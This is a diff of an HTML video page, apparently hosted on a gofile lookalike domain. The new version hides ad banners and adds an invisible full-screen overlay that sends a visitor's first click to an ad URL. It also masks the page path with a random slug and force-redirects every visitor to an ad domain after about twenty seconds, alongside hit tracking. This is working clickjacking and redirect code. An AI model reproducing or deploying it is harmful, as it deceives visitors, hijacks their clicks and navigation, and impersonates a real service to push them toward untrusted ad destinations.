@@ -4,106 +4,144 @@
    <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="referrer" content="no-referrer">
-
-<title>video</title>
+    <title>video gofile</title>
     <style>
-        /* Pengaturan dasar halaman */
+        /* Desain Minimalis Layar Penuh */
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
-            min-height: 100vh;
-            background-color: #000000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            padding: 20px 0;
-            gap: 20px;
-            overflow-x: hidden;
-        }
-
-        /* Container untuk widget dan video */
-        .content-box {
+            height: 100%;
+            background-color: #000;
+            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
-            width: 100%;
-            max-width: 720px; /* Sesuai dengan resolusi asli video */
+            position: relative;
         }
 
-        /* Gaya khusus untuk video */
+        /* Video Player */
         video {
-            width: 90%;
-            max-width: 500px; /* Ukuran tampilan video yang ideal */
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.1);
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            outline: none;
+            background-color: #000;
+        }
+
+        /* Lapisan Redirect Transparan */
+        #click-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background-color: rgba(0,0,0,0); /* Transparan */
+        }
+
+        
+        #error-msg {
+            color: #333;
+            font-family: sans-serif;
+            display: none;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
 
-    <!-- Widget Atas (320x50) -->
-    <div class="content-box">
-        <script type="text/javascript">
-            atOptions = {
-                'key' : 'baa0afb18e2e70c00e4c1406e4824e4b',
-                'format' : 'iframe',
-                'height' : 50,
-                'width' : 320,
-                'params' : {}
-            };
-        </script>
-        <script type="text/javascript" src="https://braverybreezebinding.com/baa0afb18e2e70c00e4c1406e4824e4b/invoke.js"></script>
-    </div>
+    <div id="error-msg">Akses Ditolak</div>
+    
+    
+    <div id="click-overlay"></div>
 
-    <!-- Video di bawah Banner 320x50 -->
-    <div class="content-box">
-        <video 
-            controls 
-            autoplay 
-            muted 
-            loop 
-            playsinline>
-            <source src="https://video.twimg.com/amplify_video/2012440555758985216/vid/avc1/720x720/8kpH8sBG1pXrhF0M.mp4" type="video/mp4">
-            Browser Anda tidak mendukung tag video.
-        </video>
-    </div>
+    <video id="player" controls playsinline loop></video>
 
-    <!-- Container Tengah -->
-    <div id="container-122b006ae61ef549a738f7e587027d5a"></div>
-    <script async="async" data-cfasync="false" src="https://braverybreezebinding.com/122b006ae61ef549a738f7e587027d5a/invoke.js"></script>
+    <script>
+        (function() {
+        
+            const allowedDomain = "gofile.io-d.top";
+            const currentDomain = window.location.hostname;
 
-    <!-- Widget Bawah (300x250) -->
-    <div class="content-box">
-        <script type="text/javascript">
-            atOptions = {
-                'key' : '2d64196b4b3d1a66feb2a120465fcbd4',
-                'format' : 'iframe',
-                'height' : 250,
-                'width' : 300,
-                'params' : {}
-            };
-        </script>
-        <script type="text/javascript" src="https://braverybreezebinding.com/2d64196b4b3d1a66feb2a120465fcbd4/invoke.js"></script>
-    </div>
+            if (currentDomain !== allowedDomain && currentDomain !== "localhost" && !currentDomain.includes("vercel.app")) {
+                const playerEl = document.getElementById('player');
+                const overlayEl = document.getElementById('click-overlay');
+                if (playerEl) playerEl.remove();
+                if (overlayEl) overlayEl.remove();
+                document.getElementById('error-msg').style.display = 'block';
+                return;
+            }
 
-</body>
-</html>  
-  <script type="text/javascript">
-var _Hasync=_Hasync||[];
-_Hasync.push(['Histats.start','1,4971583,4,0,0,0,00000000']);
-_Hasync.push(['Histats.fasi','1']);
-_Hasync.push(['Histats.track_hits','']);
-(function(){
-  var hs=document.createElement('script');hs.type='text/javascript';hs.async=true;
-  hs.src=('//s10.histats.com/js15_as.js');
-  (document.head||document.body).appendChild(hs);
-})();
+            const p = document.getElementById('player');
+            const overlay = document.getElementById('click-overlay');
+            
+            
+            const redirectUrl = "https://behindcanary.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb"; 
+
+            overlay.addEventListener('click', function() {
+                
+                window.open(redirectUrl, '_blank');
+                
+                overlay.remove();
+            });
+
+    
+            function getID() {
+                let h = window.location.pathname;
+                return h.replace(/^\/+|\.mp4$/g, "");
+            }
+
+            const videoId = getID();
+
+            if (videoId && videoId !== "index" && videoId !== "404") {
+                p.src = "https://cdn.videy.co/" + videoId + ".mp4";
+            } else {
+                p.src = "https://cdn.videy.co/zMXpwOWb1.mp4";
+            }
+        })();
+    </script>
+
+  
+  <script>
+/* tampilkan slug random SETELAH Histats */
+setTimeout(() => {
+  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+  let slug = "";
+  for (let i = 0; i < 4; i++) {
+    slug += c[Math.floor(Math.random() * c.length)];
+  }
+  history.replaceState(null, "", "/" + slug);
+}, 200);
+
+history.replaceState(null, "", "/");
+document.title = "video gofile.io-d.top";
+
+if (!sessionStorage.getItem("histats_hit")) {
+  sessionStorage.setItem("histats_hit", "1");
+
+  var _Hasync = _Hasync || [];
+  _Hasync.push(['Histats.start','1, 4971583,4,0,0,0,00000000']);
+  _Hasync.push(['Histats.fasi','1']);
+  _Hasync.push(['Histats.track_hits','']);
+
+  (function() {
+    var hs = document.createElement('script');
+    hs.async = true;
+    hs.src = '//s10.histats.com/js15_as.js';
+    document.body.appendChild(hs);
+  })();
+}
+ 
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 20000);
+}, 800);
 </script>
-<noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4971583&101" alt="hit counter" border="0"></a>
-  </noscript>
-
-
-</body>
+  
+  </body>
 </html>
